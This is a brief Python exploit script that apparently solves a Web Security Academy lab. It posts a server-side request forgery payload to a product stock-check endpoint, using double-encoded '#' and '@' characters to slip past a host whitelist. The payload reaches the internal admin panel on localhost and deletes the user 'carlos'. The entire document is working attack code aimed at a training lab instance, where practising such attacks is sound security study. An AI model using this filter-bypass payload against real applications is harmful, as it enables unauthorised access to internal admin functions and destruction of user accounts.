#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a9d00030370c23b83e866f5002900e0.web-security-academy.net'

session = requests.Session()

headers = {
    'Host': '0a9d00030370c23b83e866f5002900e0.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data_url = 'stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos'

response = requests.post(
    url + '/product/stock',
    headers=headers,
    data=data_url,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)